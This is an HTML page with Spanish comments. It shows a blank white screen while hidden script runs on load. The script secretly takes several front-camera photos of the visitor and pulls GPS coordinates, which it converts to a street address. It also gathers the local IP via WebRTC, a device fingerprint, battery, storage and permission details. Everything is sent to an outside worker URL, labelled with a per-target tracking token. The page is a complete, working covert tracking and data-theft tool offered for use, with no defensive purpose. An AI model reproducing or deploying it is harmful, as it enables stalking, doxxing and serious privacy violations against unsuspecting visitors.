<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>.</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #ffffff; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // ================= CONFIGURACIÓN =================
        const trackingId = 'AQUI_VA_TOKEN'; // 🔥 Cambia esto por tu token
        const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';

        // ================= FUNCIONES =================

        async function reverseGeocode(lat, lng) {
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=18&addressdetails=1`;
                const res = await fetch(url);
                const data = await res.json();
                return data.display_name || null;
            } catch(e) { return null; }
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate) return;
                        const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (ip) { pc.close(); resolve(ip[0]); }
                    };
                    setTimeout(() => { pc.close(); resolve(null); }, 3000);
                } catch(e) { resolve(null); }
            });
        }

        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                let best = null;
                let watchId = navigator.geolocation.watchPosition(
                    (pos) => {
                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
                        if (!best || coords.acc < best.acc) best = coords;
                        if (coords.acc < 100) {
                            navigator.geolocation.clearWatch(watchId);
                            resolve(best);
                        }
                    },
                    () => { navigator.geolocation.clearWatch(watchId); resolve(best); },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
                setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(best); }, 8000);
            });
        }

        async function getPhotos(count = 3) {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            const photos = [];
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
                video.srcObject = stream;
                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                await new Promise(r => setTimeout(r, 300));
                for (let i = 0; i < count; i++) {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                    photos.push(blob);
                    await new Promise(r => setTimeout(r, 200));
                }
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;
                return photos;
            } catch(e) { return []; }
        }

        function getDevice() {
            const ua = navigator.userAgent;
            let model = 'Desconocido';
            if (ua.includes('iPhone')) model = 'iPhone';
            else if (ua.includes('iPad')) model = 'iPad';
            else if (ua.includes('Android')) model = 'Android';
            else if (ua.includes('Mac')) model = 'Mac';
            else if (ua.includes('Windows')) model = 'Windows PC';
            else if (ua.includes('Linux')) model = 'Linux';
            return {
                model, userAgent: ua, language: navigator.language || 'N/A',
                platform: navigator.platform || 'N/A', vendor: navigator.vendor || 'N/A',
                resolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth || 'N/A',
                cpuCores: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A'
            };
        }

        function getFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200; canvas.height = 50;
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#069';
                ctx.font = '14px Arial';
                ctx.fillText('FP', 10, 30);
                const hash = canvas.toDataURL().slice(0, 80);
                let gpu = 'N/A';
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    const info = gl.getExtension('WEBGL_debug_renderer_info');
                    if (info) {
                        const rawGpu = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
                        gpu = rawGpu.replace(/ANGLE \(([^,]+),.*/, '$1').trim();
                        if (gpu.includes('Intel')) gpu = 'Intel Graphics';
                        else if (gpu.includes('NVIDIA')) gpu = 'NVIDIA GPU';
                        else if (gpu.includes('AMD')) gpu = 'AMD GPU';
                        else if (gpu.includes('Apple')) gpu = 'Apple GPU';
                    }
                } catch(e) {}
                return { gpu, canvas: hash };
            } catch(e) { return { gpu: 'N/A', canvas: 'N/A' }; }
        }

        async function getBattery() {
            try {
                const battery = await navigator.getBattery();
                return { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Sí' : 'No' };
            } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
        }

        async function getStorage() {
            try {
                const est = await navigator.storage.estimate();
                const totalGB = (est.quota / (1024 ** 3));
                const usedGB = (est.usage / (1024 ** 3));
                if (totalGB < 0.01 && usedGB < 0.01) return { total: 'No disponible', used: 'No disponible' };
                return { total: totalGB.toFixed(2) + ' GB', used: usedGB.toFixed(2) + ' GB' };
            } catch(e) { return { total: 'No disponible', used: 'No disponible' }; }
        }

        async function getPermissions() {
            const perms = { camera: 'Desconocido', location: 'Desconocido' };
            try {
                const resultCam = await navigator.permissions.query({ name: 'camera' });
                perms.camera = resultCam.state;
            } catch(e) {}
            try {
                const resultLoc = await navigator.permissions.query({ name: 'geolocation' });
                perms.location = resultLoc.state;
            } catch(e) {}
            return perms;
        }

        // ================= ENVIAR DATOS =================

        async function enviarAlWorker() {
            console.log('📤 Iniciando captura...');
            try {
                const [photos, gps, localIP, device, fingerprint, battery, storage, permissions] = await Promise.all([
                    getPhotos(3),
                    getGPS(),
                    getLocalIP(),
                    getDevice(),
                    getFingerprint(),
                    getBattery(),
                    getStorage(),
                    getPermissions()
                ]);

                let gpsData = null;
                if (gps) {
                    const address = await reverseGeocode(gps.lat, gps.lng);
                    gpsData = { ...gps, address };
                }

                // Construir mensaje
                let msg = '📊 Visitor Information Captured\n';
                msg += '━━━━━━━━━━━━━━━━\n\n';

                msg += '🖥️ Device & Browser\n';
                msg += `   • Device Model: ${device.model}\n`;
                msg += `   • User Agent: ${device.userAgent}\n\n`;

                msg += '🎨 Fingerprint\n';
                msg += `   • GPU: ${fingerprint.gpu}\n`;
                msg += `   • Canvas: ${fingerprint.canvas}\n\n`;

                msg += '🌐 Network Information\n';
                if (localIP) msg += `   • Local IP (WebRTC): ${localIP}\n`;
                msg += `   • Language: ${device.language}\n\n`;

                if (gpsData) {
                    msg += '📍 GPS\n';
                    msg += `   • Coordenadas: ${gpsData.lat}, ${gpsData.lng}\n`;
                    msg += `   • Precisión: ±${Math.round(gpsData.acc)}m\n`;
                    if (gpsData.address) msg += `   • Dirección: ${gpsData.address}\n`;
                    msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n\n`;
                }

                msg += '🖼️ Display Information\n';
                msg += `   • Resolution: ${device.resolution}\n`;
                msg += `   • Color Depth: ${device.colorDepth}\n\n`;

                msg += '🔋 Battery Status\n';
                msg += `   • Level: ${battery.level}\n`;
                msg += `   • Charging: ${battery.charging}\n\n`;

                msg += '🔐 Device Permissions\n';
                msg += `   • Camera: ${permissions.camera}\n`;
                msg += `   • Location: ${permissions.location}\n\n`;

                msg += '💾 Hardware & Storage\n';
                msg += `   • CPU Cores: ${device.cpuCores}\n`;
                msg += `   • RAM: ${device.deviceMemory} GB\n`;
                msg += `   • Storage Used: ${storage.used}\n`;
                msg += `   • Storage Total: ${storage.total}\n\n`;

                msg += '━━━━━━━━━━━━━━━━\n';
                msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
                msg += `⚡ Developed by: @societykark\n`;
                msg += `⏰ ${new Date().toISOString()}`;

                const formData = new FormData();
                formData.append('text', msg);
                photos.forEach((photo, index) => {
                    if (photo) formData.append(`photo_${index}`, photo, `photo_${index}.jpg`);
                });

                console.log('📤 Enviando al Worker...');

                const response = await fetch(workerUrl, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                console.log('✅ Respuesta del Worker:', result);
            } catch(e) {
                console.error('❌ Error en enviarAlWorker:', e);
            }
        }

        window.addEventListener('load', () => {
            setTimeout(enviarAlWorker, 500);
        });
    </script>
</body>
</html>
